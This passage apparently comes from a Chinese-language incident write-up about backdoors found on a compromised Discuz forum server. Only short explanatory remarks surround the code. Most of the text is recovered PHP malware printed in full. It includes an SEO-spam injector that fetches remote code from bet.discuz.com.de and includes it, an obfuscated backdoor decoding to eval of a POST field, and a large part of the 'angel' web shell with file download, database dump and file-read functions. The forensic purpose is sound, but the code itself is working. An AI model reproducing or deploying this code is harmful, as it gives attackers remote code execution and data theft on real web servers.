#8abeb7; text-decoration: underline;">'58.215.190.84'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'117.28.255.53'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'183.91.40.144'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'117.21.220.245'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'122.228.200.46'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.164.150.70'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.147.108.41'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'116.55.242.138'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'114.80.222.242'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'61.147.108.41'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'116.255.230.70'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'222.186.24.26'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'222.186.24.59'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'220.181.158.106'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'123.125.160.215'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">KBot</span>=<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'Baiduspider'</span>,<span style="color: #8abeb7;">'Googlebot'</span>,<span style="color: #8abeb7;">'Yahoo'</span>,<span style="color: #8abeb7;">'Bingbot'</span>,<span style="color: #8abeb7;">'Sosospider'</span>,<span style="color: #8abeb7;">'Sogou'</span>,<span style="color: #8abeb7;">'36</span><span style="color: #8abeb7; text-decoration: underline;">0Spider'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'YoudaoBot'</span><span style="text-decoration: underline;">);</span>
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Key</span>=<span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'anquan.org'</span>,<span style="color: #8abeb7;">'google.com'</span>,<span style="color: #8abeb7;">'soso.com'</span>,<span style="color: #8abeb7;">'%e8%b5%8c'</span>,<span style="color: #8abeb7;">'%e9%aa%b0'</span>,<span style="color: #8abeb7;">'%e9%b1%</span><span style="color: #8abeb7; text-decoration: underline;">bc'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%89%9b'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%8d%9a%e5%bd%a9'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%99%be%e5%ae%b6'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e6%a3%8b%e7%89%8c'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e6%b8%b8%e6%88%8f'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%a8%b1%e4%b9%90'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%9b%bd%e9%99%85'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%9c%9f%e4%ba%ba'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%9c%9f%e9%92%b1'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%8e%b0%e9%87%91'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e6%b3%a8%e5%86%8c'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%bc%80%e6%88%b7'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%bd%a9%e9%87%91'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e8%b5%9a%e9%92%b1'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e6%8f%90%e7%8e%b0'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e7%ad%96%e7%95%a5'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e8%af%95%e7%8e%a9'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%b9%b3%e5%8f%b0'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e5%a4%aa%e9%98%b3%e5%9f%8e'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'%e4%bd%93%e9%aa%8c%e9%87%91'</span><span style="text-decoration: underline;">);</span>
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">dec0de</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>){
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dataArr</span> = explode(<span style="color: #8abeb7;">':'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Keys</span> = explode(<span style="color: #8abeb7;">':'</span>,base64_decode(str_rot13(pack(<span style="color: #8abeb7;">'H*'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dataArr</span>[0]))));
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">News</span> = explode(<span style="color: #8abeb7;">':'</span>,base64_decode(str_rot13(pack(<span style="color: #8abeb7;">'H*'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dataArr</span>[1]))));
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Links</span>= explode(<span style="color: #8abeb7;">':'</span>,base64_decode(str_rot13(pack(<span style="color: #8abeb7;">'H*'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">dataArr</span>[2]))));
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #81a2be;">@include</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>.<span style="color: #8abeb7;">'.Wh0AmI.MODEL'</span>);<span style="color: #b5bd68;">die</span>;
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">getdata</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data_url</span>){
<span style="color: #b5bd68;">if</span> (function_exists(<span style="color: #8abeb7;">'curl_exec'</span>)) {
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span> = @curl_init();
curl_setopt(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span>, <span style="color: #81a2be;">CURLOPT_URL</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data_url</span>);
curl_setopt(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span>, <span style="color: #81a2be;">CURLOPT_HEADER</span>, 0);
curl_setopt(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span>, <span style="color: #81a2be;">CURLOPT_CONNECTTIMEOUT</span>, 5);
curl_setopt(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span>, <span style="color: #81a2be;">CURLOPT_RETURNTRANSFER</span>, 1);
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">contents</span> = @curl_exec(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span>);
@curl_close(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_curl</span>);
}<span style="color: #b5bd68;">elseif</span>(function_exists(<span style="color: #8abeb7;">'stream_context_create'</span>)) {
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_cont</span> = <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'http'</span> =&gt; <span style="color: #b5bd68;">array</span>(<span style="color: #8abeb7;">'method'</span> =&gt; <span style="color: #8abeb7;">'GET'</span>,<span style="color: #8abeb7;">'timeout'</span> =&gt; 5));
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_stre</span> = @stream_context_create(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_cont</span>);
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">contents</span> = @file_get_contents(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data_url</span>, <span style="color: #81a2be;">false</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">sp_stre</span>);
}<span style="color: #b5bd68;">else</span>{
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">handle</span> = <span style="color: #81a2be;">@fopen</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data_url</span>, <span style="color: #8abeb7;">"rb"</span>);<span style="color: #373b41; background-color: #de935f;"> </span>
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">contents</span> = @stream_get_contents(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">handle</span>);<span style="color: #373b41; background-color: #de935f;"> </span>
<span style="color: #81a2be;">@fclose</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">handle</span>);
}
<span style="color: #b5bd68;">return</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">contents</span>;
}
<span style="color: #b5bd68;">function</span> <span style="color: #de935f;">show</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>){
<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>.md5(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_HOST'</span>].<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'REQUEST_URI'</span>]);
<span style="color: #b5bd68;">if</span>(is_file(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>)){
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>=<span style="color: #81a2be;">@fopen</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>,<span style="color: #8abeb7;">'r'</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>=<span style="color: #81a2be;">@fread</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>,filesize(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>));
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #81a2be;">@fclose</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span>(<span style="color: #b5bd68;">empty</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>)) {<span style="color: #81a2be;">@unlink</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>);<span style="color: #b5bd68;">return</span>;}
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   dec0de(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>);
} <span style="color: #b5bd68;">else</span> {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>=getdata(<span style="color: #8abeb7;">'http://bet.discuz.com.de/w0shiOo7.php?HOST='</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_H</span><span style="color: #8abeb7; text-decoration: underline;">OST'</span><span style="text-decoration: underline;">]);</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>=<span style="color: #81a2be;">@fopen</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">filename</span>,<span style="color: #8abeb7;">'w'</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #81a2be;">@fwrite</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #81a2be;">@fclose</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fp</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">if</span>(strlen(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>) &gt; 1000) {
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   dec0de(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">data</span>);
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   }
}}
<span style="color: #b5bd68;">if</span>(<span style="color: #81a2be;">!</span>in_array(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">IP</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">KIP</span>)){
<span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">KBot</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">KBots</span>){<span style="color: #b5bd68;">if</span>(stristr(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Bot</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">KBots</span>)){
show(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fileDir</span>);
}}<span style="color: #b5bd68;">foreach</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Key</span> <span style="color: #b5bd68;">as</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Keys</span>){
<span style="color: #b5bd68;">if</span>(stristr(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Ref</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">Keys</span>)){
<span style="color: #b5bd68;">echo</span> <span style="color: #8abeb7;">"&lt;div style='display:none'&gt;&lt;script language='javascript' src='http://count3</span><span style="color: #8abeb7; text-decoration: underline;">1.51yes.com/click.aspx?id=310940343&amp;logo=1' charset='gb2312'&gt;&lt;/script&gt;&lt;/div&gt;&lt;script type='text/javascript' src='http://api.discuz.com.de/Seo.js'&gt;&lt;/script&gt;"</span><span style="text-decoration: underline;">;}}}</span><span style="color: #373b41; background-color: #de935f; text-decoration: underline;">      </span>
</pre>
</div></li>
</ul>

<p>
上面代码的目的就是下载恶意代码并执行。  
</p>
</div>
</div>

<div id="outline-container-org390262f" class="outline-2">
<h2 id="org390262f">继续排查</h2>
<div class="outline-text-2" id="text-org390262f">
<p>
通过比较svn中的代码与现网的代码还发现了一个新的后门程序
</p>

<ul class="org-ul">
<li><p>
<code>uc_client/control/class.php</code>
</p>

<div class="org-src-container">
<pre class="src src-php"><span style="color: #b294bb;">&lt;?php</span> <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">mt</span>=<span style="color: #8abeb7;">"mFsKCleRfU"</span>; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">ojj</span>=<span style="color: #8abeb7;">"IEBleldle"</span>; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">hsa</span>=<span style="color: #8abeb7;">"E9TVFsnd2VuJ10p"</span>; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">fnx</span>=<span style="color: #8abeb7;">"Ow=="</span>; <span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674; text-decoration: underline;">zk</span><span style="text-decoration: underline;"> = str_replace(</span><span style="color: #8abeb7; text-decoration: underline;">"d"</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">""</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">"sdtdrd_redpdldadcde"</span><span style="text-decoration: underline;">); </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">ef</span><span style="text-decoration: underline;"> = </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">"z"</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">""</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">"zbazsze64_zdzeczodze"</span><span style="text-decoration: underline;">); </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dva</span><span style="text-decoration: underline;"> = </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">"p"</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">""</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">"pcprpepaptpe_fpupnpcptpipopn"</span><span style="text-decoration: underline;">); </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">zvm</span><span style="text-decoration: underline;"> = </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">dva</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">''</span><span style="text-decoration: underline;">, </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">ef</span><span style="text-decoration: underline;">(</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">zk</span><span style="text-decoration: underline;">(</span><span style="color: #8abeb7; text-decoration: underline;">"le"</span><span style="text-decoration: underline;">, </span><span style="color: #8abeb7; text-decoration: underline;">""</span><span style="text-decoration: underline;">, </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">ojj</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">mt</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">hsa</span><span style="text-decoration: underline;">.</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">fnx</span><span style="text-decoration: underline;">))); </span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">zvm</span><span style="text-decoration: underline;">(); </span><span style="color: #b294bb; text-decoration: underline;">?&gt;</span>
</pre>
</div>

<p>
解码后的结果
</p>

<div class="org-src-container">
<pre class="src src-php"><span style="color: #81a2be;">@eval</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">$</span><span style="color: #f0c674;">_POST</span>[<span style="color: #8abeb7;">'wen'</span>]);
</pre>
</div>

<p>
上面的脚本可以注入任意的代码。
</p></li>

<li><p>
<code>./uc_server/data/tmp/angel.php</code>
</p>

<pre class="example">
&lt;?php
error_reporting(7);
@set_magic_quotes_runtime(0);
ob_start();
$mtime = explode(' ', microtime());
$starttime = $mtime[1] + $mtime[0];
define('SA_ROOT', str_replace('\\', '/', dirname(__FILE__)).'/');
define('IS_WIN', DIRECTORY_SEPARATOR == '\\');
define('IS_COM', class_exists('COM') ? 1 : 0 );
define('IS_GPC', get_magic_quotes_gpc());
$dis_func = get_cfg_var('disable_functions');
define('IS_PHPINFO', (!eregi("phpinfo",$dis_func)) ? 1 : 0 );
@set_time_limit(0);@preg_replace("/[email]/e",$_POST['Id'],"error");

foreach($_POST as $key =&gt; $value) {
    if (IS_GPC) {
        $value = s_array($value);
    }
    $$key = $value;
}
/*===================== 程序配置 =====================*/

//echo encode_pass('angel');exit;
//angel = ec38fe2a8497e0a8d6d349b3533038cb
// 如果需要密码验证,请修改登陆密码,留空为不需要验证
$pass  = 'ec38fe2a8497e0a8d6d349b3533038cb'; //angel

//如您对 cookie 作用范围有特殊要求, 或登录不正常, 请修改下面变量, 否则请保持默认
// cookie 前缀
$cookiepre = '';
// cookie 作用域
$cookiedomain = '';
// cookie 作用路径
$cookiepath = '/';
// cookie 有效期
$cookielife = 86400;

//程序搜索可写文件的类型
!$writabledb &amp;&amp; $writabledb = 'php,cgi,pl,asp,inc,js,html,htm,jsp';
/*===================== 配置结束 =====================*/

$charsetdb = array('','armscii8','ascii','big5','binary','cp1250','cp1251','cp1256','cp1257','cp850','cp852','cp866','cp932','dec8','euc-jp','euc-kr','gb2312','gbk','geostd8','greek','hebrew','hp8','keybcs2','koi8r','koi8u','latin1','latin2','latin5','latin7','macce','macroman','sjis','swe7','tis620','ucs2','ujis','utf8');
if ($charset == 'utf8') {
    header("content-Type: text/html; charset=utf-8");
} elseif ($charset == 'big5') {
    header("content-Type: text/html; charset=big5");
} elseif ($charset == 'gbk') {
    header("content-Type: text/html; charset=gbk");
} elseif ($charset == 'latin1') {
    header("content-Type: text/html; charset=iso-8859-2");
} elseif ($charset == 'euc-kr') {
    header("content-Type: text/html; charset=euc-kr");
} elseif ($charset == 'euc-jp') {
    header("content-Type: text/html; charset=euc-jp");
}

$self = $_SERVER['PHP_SELF'] ? $_SERVER['PHP_SELF'] : $_SERVER['SCRIPT_NAME'];
$timestamp = time();

/*===================== 身份验证 =====================*/
if ($action == "logout") {
    scookie('loginpass', '', -86400 * 365);
    @header('Location: '.$self);
    exit;
}
if($pass) {
    if ($action == 'login') {
        if ($pass == encode_pass($password)) {
            scookie('loginpass',encode_pass($password));
            @header('Location: '.$self);
            exit;
        }
    }
    if ($_COOKIE['loginpass']) {
        if ($_COOKIE['loginpass'] != $pass) {
            loginpage();
        }
    } else {
        loginpage();
    }
}
/*===================== 验证结束 =====================*/

$errmsg = '';
!$action &amp;&amp; $action = 'file';

// 查看PHPINFO
if ($action == 'phpinfo') {
    if (IS_PHPINFO) {
        phpinfo();
        exit;
    } else {
        $errmsg = 'phpinfo() function has non-permissible';
    }
}

// 下载文件
if ($doing == 'downfile' &amp;&amp; $thefile) {
    if (!@file_exists($thefile)) {
        $errmsg = 'The file you want Downloadable was nonexistent';
    } else {
        $fileinfo = pathinfo($thefile);
        header('Content-type: application/x-'.$fileinfo['extension']);
        header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
        header('Content-Length: '.filesize($thefile));
        @readfile($thefile);
        exit;
    }
}

// 直接下载备份数据库
if ($doing == 'backupmysql' &amp;&amp; !$saveasfile) {
    if (!$table) {
        $errmsg ='Please choose the table';
    } else {
        $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
        $filename = basename($dbname.'.sql');
        header('Content-type: application/unknown');
        header('Content-Disposition: attachment; filename='.$filename);
        foreach($table as $k =&gt; $v) {
            if ($v) {
                sqldumptable($v);
            }
        }
        mysql_close();
        exit;
    }
}

// 通过MYSQL下载文件
if($doing=='mysqldown'){
    if (!$dbname) {
        $errmsg = 'Please input dbname';
    } else {
        $mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);
        if (!file_exists($mysqldlfile)) {
            $errmsg = 'The file you want Downloadable was nonexistent';
        } else {
            $result = q("select load_file('$mysqldlfile');");
            if(!$result){
                q("DROP TABLE IF EXISTS tmp_angel;");
                q("CREATE TABLE tmp_angel (content LONGBLOB NOT NULL);");
                //用时间戳来表示截断,避免出现读取自身或包含__angel_1111111111_eof__的文件时不完整的情况
                q("LOAD DATA LOCAL INFILE '".addslashes($mysqldlfile)."' INTO TABLE tmp_angel FIELDS TERMINATED BY '__angel_{$timestamp}_eof__' ESCAPED BY '' LINES TERMINATED BY '__angel_{$timestamp}_eof__';");
                $result = q("select content from tmp_angel");
                q("DROP TABLE tmp_angel");
            }
            $row = @mysql_fetch_array($result);
            if (!$row) {
                $errmsg = 'Load file failed '.mysql_error();
            } else {
                $fileinfo = pathinfo($mysqldlfile);
                header('Content-type: application/x-'.$fileinfo['extension']);
                header('Content-Disposition: attachment; filename='.$fileinfo['basename']);
                header("Accept-Length: ".strlen($row[0]));
                echo $row[0];
                exit;
            }
        }
    }
}

?&gt;
&lt;html&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=gbk"&gt;
&lt;title&gt;&lt;?php echo $action.' - '.$_SERVER['HTTP_HOST'];?&gt;&lt;/title&gt;
&lt;style type="text/css"&gt;
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.input{font:12px Arial,Tahoma;background:#fff;border: 1px solid #666;padding:2px;height:22px;}
.area{font:12px 'Courier New', Monospace;background:#fff;border: 1px solid #666;padding:2px;}
.bt {border-color:#b0b0b0;background:#3d3d3d url(http://t.cn/zRymOgc);color:#ffffff;font:12px Arial,Tahoma;height:22px;}
a {color: #00f;text-decoration:underline;}
a:hover{color: #f00;text-decoration:none;}
.alt1 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f1f1f1;padding:5px 15px 5px 5px;}
.alt2 td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#f9f9f9;padding:5px 15px 5px 5px;}
.focus td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#ffffaa;padding:5px 15px 5px 5px;}
.head td{border-top:1px solid #fff;border-bottom:1px solid #ddd;background:#e9e9e9;padding:5px 15px 5px 5px;font-weight:bold;}
.head td span{font-weight:normal;}
.infolist {padding:10px;margin:10px 0 20px 0;background:#F1F1F1;border:1px solid #ddd;}
form{margin:0;padding:0;}
h2{margin:0;padding:0;height:24px;line-height:24px;font-size:14px;color:#5B686F;}
ul.info li{margin:0;color:#444;line-height:24px;height:24px;}
u{text-decoration: none;color:#777;float:left;display:block;width:150px;margin-right:10px;}
.drives{padding:5px;}
.drives span {margin:auto 7px;}
&lt;/style&gt;
&lt;script type="text/javascript"&gt;
function CheckAll(form) {
    for(var i=0;i&lt;form.elements.length;i++) {
        var e = form.elements[i];
        if (e.name != 'chkall')
        e.checked = form.chkall.checked;
    }
}
function $(id) {
    return document.getElementById(id);
}
function createdir(){
    var newdirname;
    newdirname = prompt('Please input the directory name:', ''  );
    if (!newdirname) return;
    $('createdir').newdirname.value=newdirname;
    $('createdir').submit();
}
function fileperm(pfile){
    var newperm;
    newperm = prompt('Current file:'+pfile+'\nPlease input new attribute:', '');
    if (!newperm) return;
    $('fileperm').newperm.value=newperm;
    $('fileperm').pfile.value=pfile;
    $('fileperm').submit();
}
function copyfile(sname){
    var tofile;
    tofile = prompt('Original file:'+sname+'\nPlease input object file (fullpath):', '');
    if (!tofile) return;
    $('copyfile').tofile.value=tofile;
    $('copyfile').sname.value=sname;
    $('copyfile').submit();
}
function rename(oldname){
    var newfilename;
    newfilename = prompt('Former file name:'+oldname+'\nPlease input new filename:', '');
    if (!newfilename) return;
    $('rename').newfilename.value=newfilename;
    $('rename').oldname.value=oldname;
    $('rename').submit();
}
function dofile(doing,thefile,m){
    if (m &amp;&amp; !confirm(m)) {
